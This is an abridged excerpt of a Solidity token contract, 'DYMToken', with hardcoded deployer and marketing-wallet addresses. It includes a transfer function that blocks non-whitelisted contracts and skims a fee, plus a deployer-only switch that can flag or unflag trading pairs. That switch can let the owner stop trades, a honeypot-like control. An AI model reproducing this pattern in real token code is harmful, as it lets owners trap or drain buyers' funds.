...
contract DYMToken {
    ...
    address public marketingWalletAddr = address(0x0B9751213d0BD5142A5c957dAdBBc33c705e7B66);
    ...
    constructor(){
        Deployer =address(0xA2A9f69Ec69F891626194Bf1641DE8d8fE592247);
        totalSupply = 3000 * 10 ** uint256(decimals);
    ...
    function _transfer(address _from, address _to, uint256 _value) private returns(bool) {
        ...
        if (isContract(_to) && !isPairCon[_to]){
            revert();
        }
        if (isContract(_from) && !isPairCon[_from]){
            revert();
        }

        if (isPairCon[_from] || isPairCon[_to]){
            balanceOf[_from] = balanceOf[_from] - _value;
            uint256 _marketingWalletfee = _value * marketingWalletfee / 100;
            balanceOf[marketingWalletAddr] = balanceOf[marketingWalletAddr] + _marketingWalletfee;
            emit Transfer(_from, marketingWalletAddr, _marketingWalletfee);
            uint256 _amount = _value - _marketingWalletfee;
    ...
    function UpdatePairCon(address _con) external{
        require(Deployer==msg.sender);
        if(isPairCon[_con]){
            isPairCon[_con] = false;
        }else{
            isPairCon[_con] = true;
        }
    }
